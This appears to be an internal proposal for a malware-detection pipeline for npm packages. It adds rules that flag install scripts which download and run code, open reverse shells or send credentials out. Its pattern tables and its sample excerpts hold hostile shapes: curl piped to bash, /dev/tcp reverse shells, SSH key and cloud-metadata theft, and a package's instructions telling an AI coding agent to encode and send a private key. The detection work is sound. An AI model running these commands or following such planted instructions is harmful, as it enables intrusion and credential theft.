# Proposal: round 4, agent G: loaders in install-run shell, PowerShell and batch scripts

> **Status:** built 2026-11-10, before the rule freeze (2026-11-12 00:00Z), for the owner's
> review. Three Stage 3 commits: two new rules that only add findings (**zero-loss**), and a
> script-aware masking of install text asked for by the integrator (**a small trade-off**: one
> benign version newly reported, through a bug it fixes).
> **Owner's request (2026-11-10):** "the scripts triggered by the package should be analyzed.
> For example if that .ps1 file had obfuscation it should be flagged."
> **Builds on:** agent A's `install.spawned_scripts` (`81b99d7`), [round 3](precision-round3.md)
> (method, harness), decision [0015](../decisions/0015-reviewer-verdicts.md).

## Summary

| # | Commit | What | Live (3,716 verdicted): benign / positives / unverified changed | `vm-day1` malicious | Kind |
|---|---|---|---|---|---|
| L | `e91c319` `npm.install-script-loader` v1, new | install scripts and hook lines that download or decode code and run it, or hide it (`curl \| sh`, `-EncodedCommand`, `irm \| iex`, `[char]` chains, `certutil -urlcache`, ...); LOW from the package's own site | 0 / 0 / 0 (0 fires in a day of 2,044 live hooked versions) | fires on 8, all reported already; 0 gained, 0 lost | **zero-loss** |
| M | `922c423` script masking in `install_persistence.code_text` (`lang.shell.mask_script_messages`, new) | messages printed through a script's own print-only function are not code (`@ornexus/neocortex@4.61.5`'s false `shell-rc`); an `echo` that pipes or writes a file is; fixes a line shift after blank-line comments | **+1 benign** (`node-sword-interface@1.0.127`) / 0 / 0 | the 4 samples with install scripts: unchanged | **trade-off (small)** |
| X | `09c4659` `npm.install-script-exfil` v1, new | install scripts and hook lines that pipe output into an upload, upload a file, read the cloud metadata service or name a credential file | 0 / 0 / 0 (0 fires in the same day) | fires on 81; **+3 reported** (`justgetit@1.2.4`, `ts-form-helpers` 1.0.3, 1.0.12), 0 lost | **zero-loss** |

Live, all three: 1,608 → 1,609 reported (benign 1,306 → 1,307), precision 17.24% → 17.23%
([section 4](#4-live)). `vm-day1`: +3 malicious samples reported, 0 lost. The rules are a
recall and evidence change, not a precision one: live install scripts are rare (64 of 3,716
verdicted versions) and none does what they look for; what they add is that a hostile
`install.ps1`/`setup.sh` is now reported for what it does, not only because the package has a
hook (agent B is narrowing that signal; owner question 1).

## 1. What read an install-run script before

A shell, PowerShell or batch script is install code when a hook names it on its command line
(`"postinstall": "sh setup.sh"`, `powershell -File x.ps1`, `./build.sh build`:
`install.files_named`) or when install JavaScript starts it by a constant name
(`install.spawned_scripts`). Both kinds land in `install_sources` and get the same reading by
every install rule. What each rule did with one (checked in the code and with tests in
`tests/ecosystems/npm/test_install_loader.py`):

| Rule (stage) | On a `.sh`/`.ps1`/`.bat`/`.cmd` install script |
|---|---|
| Stage 2 file rules | read like any new text file: `exfil-endpoint`, `hardcoded-ip`, `encoded-url`, `sensitive-path`, `env-harvest`, `shell-startup`, `encoded-blob` (LOW), `padded-code`. The obfuscation and code rules are JavaScript forms and never match a script: `static.obfuscated` (`_0x` names), `dynamic-code` (`eval(`, `new Function(`), `process-exec`/`network` (`require("child_process")`). `padded-code` wants `(` or `=` in the hidden tail, so `curl ... \| sh` behind 150 tabs is not code to it |
| `npm.install-script-code` (3) | no capability: tree-sitter profiles JavaScript only. Its v3 hidden-code check does read scripts (on `code_text`), except on `echo` lines, which `code_text` blanked whole: `echo ok<150 tabs>; <payload>` was missed (fixed by commit M: `test_hidden_code_on_an_echo_line`) |
| `npm.install-script-changed` v5 (3) | updates only. Its `TOUCHED` lexicon (`curl`, `iex`, `powershell`, `certutil`, `\| sh`, 100+ base64) keeps the MEDIUM when a script's changed lines have one; a new package has no base and gets nothing |
| `npm.install-script-obfuscated` (3) | runs on scripts, but `_0x` and javascript-obfuscator's rotation prologue never occur in one |
| `npm.install-persistence` (3) | yes (agent paths, shell rc, persistent PATH, system packages) |
| `npm.install-hook` (1) | the command line only: MEDIUM for any new package with a hook, HIGH for an added hook |

So an `install.ps1` with `-EncodedCommand`, `[char]` codes or `irm ... | iex` in a new
package was reported only because the package has a hook at all, a signal agent B is
narrowing this round; in an update, only because the script changed.

Not covered either way: a script that another script starts (`setup.sh` runs `./stage2.sh`;
`spawned_scripts` does not follow scripts), and a hook path written Windows-style
(`powershell -File .\scripts\x.ps1`: `files_named` strips `./` only). Both need edits to
existing `install.py` functions, outside this agent's ownership (owner question 2).

## 2. The rules

`npm.install-script-loader` v1 (`ecosystems/npm/rules/install_loader.py`, Stage 3, MEDIUM,
weight 3). It reads the install scripts (`.sh .bash .zsh .ps1 .psm1 .bat .cmd`, and a
suffix-less file starting `#!`) and the hook command lines, after
`lang.shell.mask_script_messages` (new): comment lines and lines that only print are blanked,
offsets kept. A line prints when it starts with `echo`, `printf`, `Write-Host`/`-Output`/
`-Warning`/`-Information`, or a function the script defines whose body only prints
(`info() { echo -e "  $1"; }`); it is a message only when nothing outside its quotes pipes,
redirects to a file (`>&2`, `/dev/null`, `/dev/tty` are fine), chains another command or
substitutes one (`$(`, a backtick).

| Shape | Matches (case-insensitive where Windows) |
|---|---|
| `pipe-to-shell` | `curl`/`wget` ... `\|` `sh`/`bash`/`zsh`/`dash`/`ksh` (with `sudo`, `env`, a path; not `bash -c`), or into `python`/`perl`/`ruby`/`node` reading stdin (not `python -c '...json...'`, not `jq`) |
| `shell-runs-download` | `bash -c "$(curl ...)"`, `sh <(curl ...)`, `eval "$(wget ...)"`, `source <(curl ...)`, backticks |
| `decoded-to-shell` | `base64 -d`/`--decode`, `xxd -r`, `openssl ... -d`, `printf '\x..'`/`echo -e '\x..'` (4+ escapes) piped into a shell or `eval`, or inside `eval "$(...)"`/`sh -c "$(...)"` |
| `reverse-shell` | `/dev/tcp/host/port`, `/dev/udp/...`, `nc`/`ncat`/`netcat ... -e /bin/sh` |
| `ps-encoded-command` | `powershell`/`pwsh` ... `-e`/`-ec`/`-enc`/`-EncodedCommand` + 20+ base64 characters |
| `ps-iex-download` | `iex`/`Invoke-Expression`/`[scriptblock]::Create` with `DownloadString`/`DownloadData`/`Invoke-WebRequest`/`iwr`/`irm`/`Net.WebClient` on the line, or a download piped into `iex` |
| `ps-iex-decoded` | `iex` with `FromBase64String`, `.GetString(`, `-join`, `[char]`, `-bxor` on the line, or those piped into `iex` |
| `ps-load-assembly` | `[Reflection.Assembly]::Load(` |
| `char-codes` | 8+ `[char]N +` in a row, or `[char[]](N, N, ...)` with 8+ codes |
| `string-reversal` | `-join ... [-1..` (a reversed string), `\| rev \| sh` |
| `batch-substrings` | 8+ `%var:~N,M%` in a row |
| `windows-downloader` | `certutil -urlcache`/`-decode`/`-decodehex`, `bitsadmin /transfer`, `mshta http:`/`vbscript:`/`javascript:`, `rundll32 ... javascript:`/`mshtml,RunHTMLApplication`, `regsvr32 ... /i:http` |
| `hidden-padding` | in a script, code after 100+ spaces or tabs (outside quotes, not a comment) that `npm.install-script-code`'s hidden-code check doesn't report (a tail starting with a quote) |

- **Severity by host** (owner's brief: "decide from data whether that shape is MEDIUM or
  LOW"). For `pipe-to-shell`, `shell-runs-download` and `ps-iex-download` the host of the URL
  on the match (else on its line) is compared with the package's own sites: the registrable
  domain of its `homepage`, `repository` and `bugs` URLs, and `github.com`/
  `raw.githubusercontent.com`/`objects.githubusercontent.com` under the repository's owner
  (GitHub's hosts serve anyone's files, so the owner decides). When every match is from the
  package's own site the finding is LOW, weight 1, and says so; any other shape keeps MEDIUM.
  A raw IP address, a paste site, a tunnel, a URL shortener or a file drop (`RISKY_HOSTS`) is
  named in the explanation. A third-party host (`sh.rustup.rs`, `claude.ai`, `bun.sh`) stays
  MEDIUM: an attacker's own domain looks the same.
- **Updates**: only a (shape, host) pair the previous version's install code didn't have
  counts; the same `curl https://x | sh` moved to a new path does not fire again.
- **Not JavaScript.** `scan2.py` ran the shapes over every live hooked version's whole install
  code, JavaScript included: 34 versions match, every JavaScript match is help text in a
  returned string or an array (`bun`'s `install.js` x10, `agentiqa` x4, `symbiot`, `gloomberb`,
  `praana`, `alpha-harness`) or a vendor installer the code runs on purpose (`@swirls/cli`,
  `dsh-remote-huaweicloud-devbridge`), and `zn-gate`'s own detector regex. They are all
  reported anyway, so reading JavaScript would add no live report, but it would put wrong
  evidence in front of the reviewer, and an installer that does run `curl | sh` from
  JavaScript has `process` for `npm.install-script-code`. `vm-day1` (section 5) confirms
  JavaScript adds no recall.

`npm.install-script-exfil` v1 (same module, same reading, MEDIUM, weight 3, new shapes only),
added after the `vm-day1` scan found three malicious samples whose hook-run script is caught by
nothing else (section 5):

| Shape | Matches |
|---|---|
| `upload-output` | a pipe into `curl`/`wget` that uploads stdin: `--data-binary @-`, `-d @-`, `--data-raw @-`, `-T -`, `-F x=@-` |
| `upload-file` | `curl -F x=@file`, `--data-binary @file`, `-T file`/`--upload-file file`, `wget --post-file` |
| `cloud-metadata` | `169.254.169.254`, `metadata.google.internal`, `100.100.100.200` |
| `credential-files` | `.ssh/id_rsa`/`id_ed25519`/`id_ecdsa`/`id_dsa`, `.aws/credentials`, `.git-credentials`, `.docker/config.json`, `.kube/config`, `/etc/shadow`, and `.npmrc` under the home directory (`~/`, `$HOME/`, `%USERPROFILE%\`) |

## 3. Method

- **Shape frequency, live** (`scan.py`, `scan2.py`): every verdicted live version with an
  install hook (1,743; 59 without a tarball), its install code rebuilt with `main`'s
  `install_sources` from the run's captured blobs or the registry (read in memory with
  `extract_tar_gz`, nothing run), the new and the base version.
- **Shape frequency, `vm-day1`** (`ddscan.py`): every malicious sample (3,444), its files
  decrypted in memory by the predictor's own `_new_tree`, `install_sources` and the rule's
  `loader_shapes` on all install files (JavaScript too, to decide whether to read it).
- **Live replay with the real code** (round 3's `replay.py`, unchanged), `main` and each
  commit's tree, on the 64 verdicted versions whose install code includes a script: the only
  ones any of the three commits can change (both rules read only scripts and hook command
  lines, no verdicted hook line has a shape, and the masking applies to script files only).
  The other 3,652 decide as on `main` by construction.
- **A day of live collection** (`livescan.py`): every hooked version Stage 3 read in the 23
  runs `20261109T024424Z` to `20261110T014424Z` (2,044 with the tarball captured, reviewed or
  not), both rules' shapes against the base's.
- **`vm-day1`**: `pipeline+4` (`dd.py`, round 3's) with `main` and with this branch on the
  103 malicious samples either rule fires on or with an install script, in a scratch data dir
  built as agent F's (`mkdata_g.py`); a sample can only gain a report.

## 4. Live

| Live (real code) | Reported | Benign | Unwanted | Malicious | Unverified | Precision |
|---|---|---|---|---|---|---|
| `main` `a4f2e02` (A's measured tree with R1; F's rule changes no live decision) | 1,608 | 1,306 | 225 | 47 | 30 | 17.24% |
| + L (loader) | 1,608 | 1,306 | 225 | 47 | 30 | 17.24% |
| + M (masking) | 1,609 | 1,307 | 225 | 47 | 30 | 17.23% |
| + X (exfil) | 1,609 | 1,307 | 225 | 47 | 30 | 17.23% |

On the 64 script versions (`out/s64-*.jsonl`): main → L changes no finding; L → M changes one
version, `node-sword-interface@1.0.127` (benign): `npm.install-script-changed` LOW → MEDIUM,
"The change touches URLs or hosts." (`build_sword.sh`'s new `git clone
https://github.com/ezra-bible-app/crosswire-sword sword`). Under `main` the masked text was one
line off from the second comment on (the old `_SCRIPT_TALK` pattern's `^\s*` ran from a blank
line into the comment after it and blanked the newline), so v5 compared the wrong lines;
the fix is correct by v5's own test, and the version is benign by verdict. M → X changes none.
No positive, unwanted or unverified version changes.

`@ornexus/neocortex@4.61.5` (unwanted, verdicted after the shared snapshot): with M, its
`install.sh` no longer gives a `shell-rc` form for line 1482 (`info "Para persistir: ...
>> ~/.bashrc"`, a message through the script's `info() { echo -e "  ${DIM}${SYM_ARROW} $1${NC}"; }`);
the `agent` forms stay (`install.sh:600` `${HOME}/.claude/agents/neocortex`, `install.ps1:160`),
and the line numbers are now right (`main` said 578 and 1406). `static.shell-startup` (Stage
2, agent D's) still matches that line in the raw text; not changed here.

Which live versions the rules would fire on if they read JavaScript too (rejected, section 6):
34 hooked versions, all reported already.

## 5. DataDog (`vm-day1`)

| `vm-day1` malicious (103 samples: either rule fires, or an install script) | `main` | this branch |
|---|---|---|
| reported | 100 | **103** |
| `npm.install-script-loader` fires | | 8 (MEDIUM) |
| `npm.install-script-exfil` fires | | 81 (MEDIUM) |

- **Gained:** `justgetit@1.2.4` (score 2 → 5; `postinstall: bash src/postinstall.sh`, which
  runs `ln -s ~/.ssh/id_ed25519 ./justgetit_tmp/index.txt` and then prints instructions
  addressed to an AI coding agent: read that file, base64 it, run `npx justgetit`),
  `ts-form-helpers@1.0.3` (1 → 4; `bash scripts/setup.sh` posts `env` and the global git
  config to `aaronstack.com`, installs a git wrapper that steals tokens, pushes to another
  repository) and `ts-form-helpers@1.0.12` (1 → 4; the same script family reading a GCP token
  from `metadata.google.internal`). Lost: none.
- **Where the loader shapes are.** Only 4 of the 3,444 samples run an install script; the 8
  loader fires are on hook command lines: `curl ... | node` (`@optimystic99/dev-utils`),
  `curl https://webhook.site/... | bash` (`@sangith/eslint-config`), `curl
  https://raw.githubusercontent.com/cyberX3993/... | sh` (`overstock-logger`), `curl
  https://y.wbx.lt/x.txt | bash` (`overstock-health-express`) and four `bash -i >&
  /dev/tcp/...` reverse shells (`admin10001`, `classlink`, `dzengi`,
  `elf-stats-snowdusted-train-837`). All were reported already;
  `@optimystic99/dev-utils@1.0.17` only by `npm.install-hook` (owner question 1).
- **M on `vm-day1`:** the 4 samples with install scripts (`justgetit`, `npm-global-util`,
  `ts-form-helpers` x2) decide the same with `main` and with M.
- **Not reached:** 137 malicious samples ship a `.sh`/`.ps1`/`.bat`/`.cmd` that no hook or
  install code names by a constant path (owner question 2).

- **`vm-day1` benign** (`ddscan.py` with `LABEL=benign`, both rules' shapes on the new
  version's install code, no base subtracted, so an upper bound): 1,452 samples read (48
  without files), 34 with an install hook, 1 with an install script: **0 fires**.

## 6. Rejected

- **Reading JavaScript install files too.** Live: 34 hooked versions match, every JavaScript
  match help text or a deliberate vendor installer (`bun@1.4.4-canary.*` x10: `"curl -fsSL
  https://bun.com/install | bash"` in a message; `agentiqa` staging builds x4: a
  `deb.nodesource.com | sudo -E bash` CI hint; `zn-gate`: its own detector's regex source).
  All already reported, so no live report changes, but the evidence would be wrong.
  `vm-day1`: 474 malicious samples match in JavaScript, almost all Shai-Hulud 2.0's
  `setup_bun.js` (`curl -fsSL https://bun.sh/install | bash`: installing Bun, the worm's
  runtime, not its payload); every one is reported already except 9 that Stage 1 never routes
  (`@postman/pm-bin-*` 1.24.4/1.24.5 x8, `@asyncapi/studio@1.0.3`: score 0, no files read), so
  no recall either way.
- **A bare environment dump (`env`, `printenv`) as an exfil shape.** The one live hit is
  `@codyswann/lisa@4.90.1` (benign) reading `env` to unset variables
  (`done < <(env)`); the `vm-day1` sample that has it (`ts-form-helpers@1.0.3`) also pipes it
  into an upload, which is the shape kept.
- **`.npmrc` anywhere.** `cp .npmrc.example .npmrc` is the project's own file; only a path under
  the home directory (`~/.npmrc`, `$HOME/.npmrc`, `%USERPROFILE%\.npmrc`) counts.
- **LOW for any vendor installer host.** `sh.rustup.rs`, `claude.ai/install.sh`, `bun.sh`,
  `ollama.com` are what benign install code pipes into a shell, but an attacker's domain looks
  the same, and no host list can tell a new vendor from a new attacker. Only the package's own
  site (homepage, repository, bugs; GitHub by owner) is LOW. No live version is affected
  either way today.
- **`chmod +x` then run a downloaded file** (brief). Not built: it is how binary installers work
  (`ryskv12`'s `fetch_latest_release.sh`: `curl -fL -o ryskV12 ... && chmod +x ryskV12`), no
  `vm-day1` sample with an install script does it, and running the file is not visible as one
  shape (it is started later by name).
- **`static.padded-code` variant for scripts.** Agent F's rule wants `(` or `=` in the hidden
  tail; a shell tail such as `; curl -s x | sh` has neither. Not changed (F's rule); the script
  case is covered by `npm.install-script-code` v3 (with the new masking) and this rule's
  `hidden-padding` shape. No live or `vm-day1` script has 100+ whitespace before code.

## 7. Owner questions

1. **Agent B's `npm.install-hook` change.** Of the 8 `vm-day1` malicious samples the loader
   rule fires on, `@optimystic99/dev-utils@1.0.17` (`postinstall: curl ... | node`) is reported
   today only by `npm.install-hook` (MEDIUM, a new package with a hook). With the hook finding
   LOW it stays reported only through this rule (`ifhook.py`); the other 7 keep another
   MEDIUM. Worth checking against B's final shape.
2. **Two gaps in `install.py` this agent didn't touch** (existing functions, not mine): a
   script another script starts is not read (`spawned_scripts` doesn't follow scripts; 137
   `vm-day1` malicious samples ship a `.sh`/`.ps1`/`.bat` that no hook or install code names
   by a constant path), and a Windows hook path `.\scripts\x.ps1` is not resolved
   (`files_named` strips `./` only). Neither occurs in a live verdicted hook today.
3. **`node-sword-interface@1.0.127`** is newly reported by the script-masking commit: its
   changed line `git clone https://github.com/ezra-bible-app/crosswire-sword sword` is now
   seen by `npm.install-script-changed` v5 ("touches URLs or hosts"); before, a line-number bug
   compared the line after it. Correct by v5's own test, benign by verdict.

## 8. Reproduce

Scripts in `~/kitsunox-scratch/r4/G/scripts/` (round 3's harness plus `scan.py`, `scan2.py`,
`ddscan.py`, `ddsum.py`, `fdiff.py`, `ddcmp.py`, `ifhook.py`, `livescan.py`, `exfil_try.py`,
`persist1.py`, `mkdata_g.py`), outputs in `~/kitsunox-scratch/r4/G/out/`. Trees: `main/src`
(`a4f2e02`), `fixA/src` (L), `fixB/src` (L + M), `fixC/src` (L + M + X = this branch);
`fix/src` is the first draft that also read JavaScript (shape scans only).

```sh
G=~/kitsunox-scratch/r4/G; S=~/kitsunox-scratch/r4/shared/cands.jsonl.zst
$G/py $G/scripts/scan.py $G/main/src $S $G/out/scan.jsonl.zst $G/out/hook.keys   # scripts per version
$G/py $G/scripts/scan2.py $G/fix/src $S $G/out/scan2.jsonl $G/out/hook.keys     # shapes incl. JS
for t in main fixA fixB fixC; do                                                # 64 script versions
  $G/py $G/scripts/replay.py $G/$t/src $S $G/out/s64-$t.jsonl 2 @$G/out/scripts.csv; done
$G/py $G/scripts/fdiff.py $G/out/s64-fixA.jsonl $G/out/s64-fixB.jsonl
$G/py $G/scripts/livescan.py $G/fixC/src 20261109T024424Z-npm 20261110T024424Z-npm $G/out/livescan.jsonl
$G/py $G/scripts/ddscan.py $G/fix/src $G/out/ddscan.jsonl.zst                    # vm-day1 malicious
$G/py $G/scripts/dd.py $G/main/src $G/out/ddall-main.jsonl 2 $G/out/dd-all.lst   # and fixC/src
$G/py $G/scripts/ddcmp.py $G/out/ddall-main.jsonl $G/out/ddall-fixC.jsonl npm.install-script-loader,npm.install-script-exfil
```
